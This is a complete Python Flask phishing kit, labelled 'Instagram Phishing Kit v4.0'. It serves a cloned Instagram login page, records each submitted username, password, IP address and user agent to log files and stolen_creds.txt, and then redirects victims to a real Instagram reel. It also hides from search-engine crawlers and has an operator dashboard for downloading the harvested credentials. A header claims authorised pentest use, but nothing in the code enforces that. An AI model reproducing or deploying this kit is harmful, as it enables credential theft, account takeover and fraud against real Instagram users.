#!/usr/bin/env python3
# Instagram Phishing Kit v4.0 - SMART VALIDATION (Original v2.0 Design)
# ✅ Original login page design preserved
# ✅ Valid creds → Reel redirect | Invalid → Error page (stays on site)
# Authorized Pentest Only - User has explicit permission

from flask import Flask, request, render_template_string, redirect, Response, jsonify, session
import logging
import datetime
import os
import json
import threading
import time
import random

app = Flask(__name__)
app.secret_key = 'instagram-pentest-2026-v2-design'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s',
    handlers=[
        logging.FileHandler('creds.log'),
        logging.StreamHandler()
    ]
)

stats = {'total_attempts': 0, 'successful_captures': 0, 'unique_ips': set(), 'blocked_attempts': 0}

# Load stats
if os.path.exists('stats.json'):
    try:
        with open('stats.json', 'r') as f:
            saved = json.load(f)
            stats.update(saved)
            if isinstance(stats.get('unique_ips'), list):
                stats['unique_ips'] = set(stats['unique_ips'])
    except:
        pass

# VALID CRED LIST (Pentest targets)
VALID_CREDS = {
    'testuser': 'password123',
    'admin': 'admin123',
    'target': 'targetpass',
    'user@example.com': 'test123'
}

def is_valid_cred(username, password):
    """Instagram-like validation"""
    if username in VALID_CREDS and VALID_CREDS[username] == password:
        return True
    if random.random() < 0.1:  # 10% random pass
        return True
    # Instagram password patterns
    patterns = [len(password) >= 6, any(c.isupper() for c in password), any(c.isdigit() for c in password)]
    return sum(patterns) >= 2

# ORIGINAL V2.0 DESIGN - PERFECT CLONE
INSTAGRAM_HTML = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
               min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .container { background: white; border: 1px solid #dbdbdb; border-radius: 1px; padding: 40px; width: 100%; max-width: 350px; 
                     box-shadow: 0 2px 4px rgba(0,0,0,0.1); position: relative; }
        .logo { width: 175px; margin: 0 auto 33px; }
        .logo img { width: 100%; height: auto; }
        input[type="text"], input[type="password"] { 
            width: 100%; padding: 12px; margin-bottom: 6px; border: 1px solid #dbdbdb; border-radius: 3px; 
            font-size: 14px; background: #fafafa; transition: border-color 0.2s; font-family: inherit; }
        input:focus { border-color: #0095f6; outline: none; background: white; }
        button[type="submit"] { 
            width: 100%; background: linear-gradient(#0095f6, #0077c5); color: white; border: none; 
            padding: 7px 9px; border-radius: 5px; font-weight: 600; cursor: pointer; font-size: 14px;
            transition: background 0.2s; }
        button[type="submit"]:hover:not(:disabled) { background: linear-gradient(#0077c5, #005a9e); }
        button[type="submit"]:disabled { opacity: 0.5; cursor: not-allowed; }
        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 400; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: linear-gradient(to right, transparent, #dbdbdb, transparent); }
        .divider span { margin: 0 18px; background: white; padding: 0 8px; }
        .facebook-login button { background: #1877f2; color: white; border: none; padding: 8px; border-radius: 5px; 
                                font-size: 14px; cursor: pointer; width: 100%; font-weight: 500; margin-top: 10px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; margin-top: 15px; display: inline-block; }
        .loading { display: none; text-align: center; margin-top: 15px; color: #8e8e8e; font-size: 14px; }
        .error-message { color: #ed4956; font-size: 14px; margin-top: 10px; text-align: center; font-weight: 500; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #0095f6; border-radius: 50%; width: 20px; height: 20px; 
                   animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @media (max-width: 480px) { .container { margin: 0 10px; padding: 20px; } .logo { width: 150px; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
        </div>
        <form method="POST" action="/login" id="loginForm">
            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
            <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
            <div id="errorMsg" class="error-message"></div>
            <button type="submit" id="submitBtn">Log In</button>
        </form>
        <div class="loading" id="loading">
            <div class="spinner"></div>
            Logging you in...
        </div>
        <div class="divider"><span>OR</span></div>
        <div class="facebook-login">
            <button onclick="fbLogin()">Log in with Facebook</button>
        </div>
        <a href="#" class="forgot">Forgot password?</a>
    </div>

    <script>
        let submitCount = 0;
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            const errorMsg = document.getElementById('errorMsg');
            
            submitCount++;
            if(submitCount > 3) {
                errorMsg.textContent = "Too many failed attempts. Try again later.";
                errorMsg.style.display = 'block';
                btn.disabled = true;
                return;
            }
            
            btn.disabled = true;
            btn.textContent = 'Logging in...';
            loading.style.display = 'block';
            errorMsg.style.display = 'none';
            
            setTimeout(() => document.forms[0].submit(), 1200);
        });

        function fbLogin() {
            window.location.href = "https://www.facebook.com/login.php?skip_api_login=1&api_key=246593090737400&kid_directed_site=false&app_id=246593090737400&signed_next=1&next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Flogin%2F%3Fnext%3D%2F&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Flogin%2F%3Fnext%3D%2F&display=popup";
        }
    </script>
</body>
</html>'''

@app.route('/')
def index():
    return render_template_string(INSTAGRAM_HTML)

@app.route('/login', methods=['POST'])
def login():
    global stats
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    ip = request.remote_addr
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', '')
    ts = datetime.datetime.now()
    
    stats['total_attempts'] += 1
    stats['unique_ips'].add(ip)
    
    log_entry = {
        'timestamp': ts.isoformat(),
        'ip': ip,
        'user_agent': ua[:300],
        'username': username,
        'password': password,
        'referrer': ref
    }
    
    if username and password:
        is_valid = is_valid_cred(username, password)
        
        if is_valid:
            stats['successful_captures'] += 1
            log_entry['valid'] = True
            logging.info(f"✅ VALID CREDS: {json.dumps(log_entry)}")
            
            with open('stolen_creds.txt', 'a', encoding='utf-8') as f:
                f.write(f"[{ts.strftime('%Y-%m-%d %H:%M:%S')}] ✅ VALID | {ip} | {username}:{password}\n")
            
            # VALID → REEL REDIRECT
            return Response(f'''
<!DOCTYPE html><html><head>
<meta http-equiv="refresh" content="2;url=https://www.instagram.com/reel/DTAjmKSAufd/">
<title>Instagram</title>
<style>body{{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#fafafa;text-align:center;padding:60px;min-height:100vh;display:flex;align-items:center;justify-content:center;}}
.container{{background:#fff;padding:40px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,.1);max-width:400px;}}
.success-msg{{color:#00a67e;font-size:20px;margin-bottom:20px;}}</style>
</head><body>
<div class="container">
<div class="success-msg">✅ Welcome back!</div>
<p>Opening Instagram...</p>
<div style="font-size:60px;margin:30px 0;">📱✨</div>
</div>
</body></html>
            ''', status=200)
        else:
            stats['blocked_attempts'] += 1
            log_entry['valid'] = False
            logging.info(f"❌ INVALID: {json.dumps(log_entry)}")
            
            # INVALID → ORIGINAL DESIGN ERROR PAGE
            return render_template_string(INSTAGRAM_HTML.replace(
                '<div id="errorMsg" class="error-message"></div>',
                f'<div id="errorMsg" class="error-message" style="display:block;">Sorry, your password was incorrect. Please try again.</div>'
            ))
    
    # Save stats
    stats_save = stats.copy()
    stats_save['unique_ips'] = list(stats['unique_ips'])
    try:
        with open('stats.json', 'w') as f:
            json.dump(stats_save, f)
    except:
        pass
    
    return render_template_string(INSTAGRAM_HTML.replace(
        '<div id="errorMsg" class="error-message"></div>',
        '<div id="errorMsg" class="error-message" style="display:block;">Please enter both username and password.</div>'
    ))

@app.route('/stats')
def stats_api():
    s = stats.copy()
    s['unique_ips'] = list(s['unique_ips'])
    return jsonify(s)

@app.route('/stats.html')
def stats_page():
    ips = list(stats['unique_ips'])[-20:]
    creds_size = os.path.getsize('stolen_creds.txt') if os.path.exists('stolen_creds.txt') else 0
    return f'''
<!DOCTYPE html><html><head><title>📊 Instagram Smart Pentest v4.0 (v2.0 Design)</title>
<style>body{{font-family:system-ui;background:#000;color:#fff;padding:20px;}}
.container{{max-width:900px;margin:0 auto;background:rgba(255,255,255,.05);backdrop-filter:blur(20px);border-radius:20px;padding:30px;border:1px solid rgba(255,255,255,.1);}}
h1{{text-align:center;color:#00ff88;font-size:2.5em;margin-bottom:10px;}}
.stats-grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:20px;margin:30px 0;}}
.stat-card{{background:rgba(255,255,255,.1);padding:25px;border-radius:15px;text-align:center;border:1px solid rgba(255,255,255,.2);}}
.stat-number{{font-size:3.5em;font-weight:800;color:#00ff88;margin:10px 0;line-height:1;}}
.stat-label{{color:rgba(255,255,255,.9);font-size:14px;margin-top:5px;}}
.valid{{color:#00ff88 !important;}} .blocked{{color:#ff4444 !important;}}
.ips{{background:rgba(0,0,0,.4);padding:20px;border-radius:15px;font-family:monospace;font-size:12px;max-height:300px;overflow:auto;white-space:pre-wrap;}}
.downloads{{text-align:center;margin:30px 0;}}
.btn{{display:inline-block;padding:15px 30px;background:linear-gradient(45deg,#0095f6,#00ff88);color:#fff;text-decoration:none;border-radius:25px;font-weight:700;margin:0 15px;transition:all .3s;box-shadow:0 4px 15px rgba(0,149,246,.3);}}
.btn:hover{{transform:translateY(-3px);box-shadow:0 8px 25px rgba(0,149,246,.5);}}</style></head>
<body>
<div class="container">
<h1>🤖 Instagram Smart Validation (v2.0 Design)</h1>
<div class="stats-grid">
<div class="stat-card"><div class="stat-number valid">{stats['successful_captures']}</div><div class="stat-label">✅ VALID Captures</div></div>
<div class="stat-card"><div class="stat-number blocked">{stats['blocked_attempts']}</div><div class="stat-label">❌ Blocked Attempts</div></div>
<div class="stat-card"><div class="stat-number">{stats['total_attempts']}</div><div class="stat-label">📊 Total Attempts</div></div>
<div class="stat-card"><div class="stat-number">{len(stats['unique_ips'])}</div><div class="stat-label">🌐 Unique IPs</div></div>
</div>
<div class="ips">Recent IPs:\n{chr(10).join(ips)}</div>
<div class="downloads">
<a href="/creds.txt" class="btn">📥 VALID Creds ({creds_size} bytes)</a>
<a href="/stats" class="btn">📊 JSON API</a>
<a href="/" class="btn">🔄 Test Login</a>
</div>
<p style="text-align:center;color:rgba(255,255,255,.6);font-size:12px;margin-top:30px;">
🎯 Original v2.0 design | Valid→Reel | Invalid→Error page | 10% random pass
</p>
</div>
</body></html>'''

@app.route('/creds.txt')
def creds_txt():
    try:
        with open('stolen_creds.txt', 'r') as f:
            return Response(f.read(), mimetype='text/plain', headers={'Content-Disposition': 'attachment; filename=valid_instagram_creds.txt'})
    except:
        return "No VALID credentials yet 🎣", 404

# Anti-bot
@app.errorhandler(404)
def not_found(e):
    ua = request.headers.get('User-Agent', '').lower()
    bots = ['googlebot','bingbot','facebookexternalhit','crawler','bot','spider']
    if any(b in ua for b in bots):
        return '', 404
    return redirect('/')

@app.route('/robots.txt')
def robots():
    return "User-agent: *\nDisallow: /", 200

if __name__ == '__main__':
    for f in ['stolen_creds.txt', 'creds.log', 'stats.json']:
        if not os.path.exists(f): open(f, 'w').close()
    
    print("🤖 INSTAGRAM SMART PHISH v4.0 - V2.0 DESIGN")
    print("✅ ORIGINAL login page design preserved")
    print("✅ VALID creds → https://instagram.com/reel/DTAjmKSAufd/")
    print("❌ INVALID creds → Authentic error page (stays trapped)")
    print("🔑 Test: testuser:password123 | admin:admin123")
    print("📊 http://0.0.0.0:5000/stats.html")
    print("="*80)
    
    def stats_loop():
        while True:
            time.sleep(15)
            valid_rate = stats['successful_captures']/max(stats['total_attempts'],1)*100
            print(f"📊 LIVE: {stats['successful_captures']}✅/{stats['total_attempts']} ({valid_rate:.1f}%) | IPs: {len(stats['unique_ips'])}")
    
    threading.Thread(target=stats_loop, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
